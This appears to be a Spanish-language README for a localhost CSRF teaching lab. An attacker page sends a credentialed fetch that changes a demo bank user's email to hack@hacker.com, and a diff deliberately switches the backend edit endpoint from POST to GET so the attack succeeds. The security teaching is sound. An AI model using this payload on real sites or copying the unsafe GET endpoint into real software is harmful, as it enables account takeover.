# 03 CSRF

## Instalación

- Hacemos un _npm install_ en el directorio de trabajo que es el 03-CSRF e instalamos todas las dependencias de las 3 apps.

```
npm install
```

- Podemos arrancar las apps con _npm start_, o arrancarlas mejor individualmente para ver el mensaje por la consola de la app de backend cuando se produzca el ataque.

```
npm start

```

- Una vez que arrancamos el frontend y el backend de mybank, podemos logearnos usando:

```

email: user@email.com
password: test

```

- Ya logeado podemos inspeccionar las _dev tools_ para ver que dentro de _Application_ tenemos almecenada nuestra cookie.

- Arrancamos a frontend-chupichuli que se abría en _localhost:1235_ esta no se abrirá automáticamente, en el navegador. Y podemos simular que nos han enviado un correo y hemos pinchado en el enlace y se ha abierto en una nueva pestaña.

- Dentro de la la ruta _frontend-chupilchuli/src/index.html_, tenemos un fetch comentado. Como está ahora mismo sería seguro y no se relaizaría el CSRF.

- Y si entramos en las _dev tools_ en la consola nos aparece lo siguiente:

```
Failed to load resource: the server responded with a status of 405 (Method Not Allowed)
```

- Pero si descomentamos el CSRF con get. 

_frontend-chupilchuli/src/index.html_

```diff
<script>
      // Esto es CSRF con post
      // fetch("/api/security/edit", {
      //   method: "POST",
      //   credentials: "include",
      //   headers: {
      //     "Content-Type": "application/json",
      //   },
      //   body: JSON.stringify({
      //     email: "hack@hacker.com",
      //   }),
      // });
      // Esto es CSRF con get
      fetch("http://localhost:3000/api/security/edit?" +
        new URLSearchParams({
                    email: "hack@hacker.com",
        }), {
        method: "GET",
        credentials: "include",
      })
        .then((response) => response.text())
        .then((text) => console.log(text))
        .catch((error) => console.log(error));
    </script>
```
Y vamos a nuestro backend a _backend-mybank/src/pods/security/security.rest-api.js_ al _endpoint_ de _edit_, y cambiamos el método _post_ por _get_.

_backend-mybank/src/pods/security/security.rest-api.js_


```diff
- .post("/edit", authenticationMiddleware, async (req, res, next) =>
+ .get("/edit", authenticationMiddleware, async (req, res, next) => {
    try {
      const newUserEmail = await userRepository.updateEmail(
        req.userSession?.id,
        req.body.email
      );
      console.log(
        `User ${req.userSession?.id} email changed to ${newUserEmail}`
      );
      res.send("Email changed");
    } catch (error) {
      next(error);
    }
  });

```

- Podemos ver por la console de _backend-mybank_ que se ha producido el ataque y hemos cambiado el correo.

```
[type-check:watch] 
[type-check:watch] 
[type-check:watch] 14:48:24 - Found 0 errors. Watching for file changes.
[start:dev       ] Server ready at port 3000
[start:dev       ] User 1 email changed to hack@hacker.com
```

- Y ahora podríamos entrar en he perdido mi contraseña y cambiarla sin ningún problema y hacer en la aplicación de mibank lo que quisiéramos.

